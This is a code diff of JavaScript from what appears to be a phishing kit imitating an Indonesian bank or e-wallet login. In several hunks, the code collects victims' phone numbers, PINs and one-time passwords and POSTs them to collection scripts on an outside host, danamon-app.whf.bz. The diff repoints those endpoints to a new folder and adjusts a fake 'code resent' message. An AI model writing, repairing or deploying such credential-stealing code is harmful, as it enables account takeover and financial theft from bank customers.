@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/0811/one.php',
+			  url: 'https://danamon-app.whf.bz/token/dana12/one.php',
 			  data: dataString,
  
     
@@ -163,7 +163,7 @@ function sendPin(){
   var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/0811/two.php',
+			  url: 'https://danamon-app.whf.bz/token/dana12/two.php',
 			  data: dataString,
  
 
@@ -196,7 +196,7 @@ $(".alert").css("color","red");
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://danamon-app.whf.bz/token/0811/tree.php',
+			  url: 'https://danamon-app.whf.bz/token/dana12/tree.php',
 			  data: dataString,
  
         
@@ -207,7 +207,7 @@ $(".alert").css("color","red");
    
     $('.inpotp').val('');
    $('#otp1').focus();
-  var nomor = sessionStorage.getItem("nomor");
+  var nomor = document.getElementById("inp").value;
         document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor +  " via<br/>";
    $(".alert").css("color","black");
     },4000);
